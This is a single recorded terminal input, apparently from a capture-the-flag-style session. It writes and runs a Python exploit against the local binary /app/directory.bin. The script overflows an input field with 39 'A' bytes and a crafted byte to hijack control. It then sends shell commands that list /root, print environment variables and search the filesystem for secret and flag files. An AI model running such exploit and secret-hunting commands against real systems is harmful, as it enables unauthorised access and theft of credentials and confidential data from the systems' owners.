[2607.209772, "i", "cat << 'EOF' > /tmp/exploit2.py\nimport subprocess, time\n\np = subprocess.Popen(['/app/directory.bin'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)\n\np.stdin.write(b\"1 A\\n\" * 9)\np.stdin.flush()\ntime.sleep(0.2)\n\np.stdin.write(b\"1 \" + b\"A\"*39 + b\"\\x3b\")\np.stdin.flush()\ntime.sleep(0.2)\n\np.stdin.write(b\"4\\n\")\np.stdin.flush()\ntime.sleep(0.2)\n\np.stdin.write(b\"echo EXPLOIT_REACHED; ls -la /root; printenv; find / -name '*secret*' -o -name '*flag*' 2>/dev/null; exit\\n\")\np.stdin.flush()\ntime.sleep(1)\n\nprint(p.stdout.read().decode('latin1'))\nEOF\npython3 /tmp/exploit2.py\n"]
